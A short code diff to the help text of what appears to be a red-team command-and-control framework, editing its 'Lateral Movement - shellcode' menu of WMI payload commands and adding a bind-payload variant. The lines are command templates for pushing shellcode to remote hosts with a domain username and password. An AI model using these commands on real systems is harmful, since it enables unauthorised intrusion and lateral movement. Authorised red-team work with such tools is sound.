@@ -348,9 +348,10 @@ invoke-winrmsession -ipaddress <ip> -user <dom\\user> -pass <pass>
 
 Lateral Movement - shellcode:
 =========================================================
-invoke-wmijspayload -target <ip> -domain <dom> -username <user> -password '<pass>'
+invoke-wmijspayload -target <ip> -domain <dom> -user <user> -pass '<pass>'
 invoke-wmijsproxypayload -target <ip> -domain <dom> -user <user> -pass '<pass>'
 invoke-wmijsdaisypayload -target <ip> -domain <dom> -user <user> -pass '<pass>'
+invoke-wmijspbindpayload -target <ip> -domain <dom> -user <user> -pass '<pass>'
 """
 
 posh_help7 = Colours.GREEN + """
